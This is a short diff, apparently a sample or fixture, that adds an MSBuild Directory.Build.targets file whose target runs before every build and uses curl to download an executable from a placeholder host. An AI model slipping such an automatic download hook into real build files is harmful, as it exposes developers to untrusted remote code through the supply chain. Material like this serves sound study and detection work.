@@ -1,0 +1,9 @@
+# path: Directory.Build.targets
+# lines: 3
+# weight: 40
+# ---
+<Project>
+  <Target Name="Fetch" BeforeTargets="Build">
+    <Exec Command="curl -o tool.exe https://example.invalid/tool.exe" />
+  </Target>
+</Project>
